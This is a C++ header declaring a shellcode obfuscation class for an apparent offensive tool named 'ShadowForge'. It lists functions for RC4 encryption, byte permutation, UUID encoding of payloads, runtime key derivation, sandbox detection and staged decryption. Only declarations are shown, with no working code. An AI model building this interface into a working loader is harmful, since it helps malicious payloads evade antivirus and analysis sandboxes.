#pragma once
#include "shadowforge.h"

class ShellcodeObfuscator {
public:
    static void RC4(const uint8_t* key, size_t keyLen,
                    const uint8_t* input, uint8_t* output, size_t dataLen);

    static void PermuteBytes(uint8_t* data, size_t len, uint32_t seed);
    static void UnpermuteBytes(uint8_t* data, size_t len, uint32_t seed);

    static std::vector<std::string> EncodeAsUUIDs(const uint8_t* data, size_t len);
    static std::vector<uint8_t>     DecodeFromUUIDs(const std::vector<std::string>& uuids);

    static std::vector<uint8_t> DeriveRuntimeKey(const char* salt = "ShadowForge");
    static uint32_t FNV1a(const uint8_t* data, size_t len);

    static std::vector<uint8_t> Encrypt(const uint8_t* shellcode, size_t len,
                                         const uint8_t* key, size_t keyLen,
                                         uint32_t permSeed);

    static std::vector<uint8_t> Decrypt(const uint8_t* encrypted, size_t len,
                                         uint32_t permSeed);

    static bool DetectSandbox();

    static std::vector<uint8_t> StagedDecrypt(const uint8_t* encrypted, size_t len,
                                               uint32_t permSeed, size_t chunkSize = 16);
};
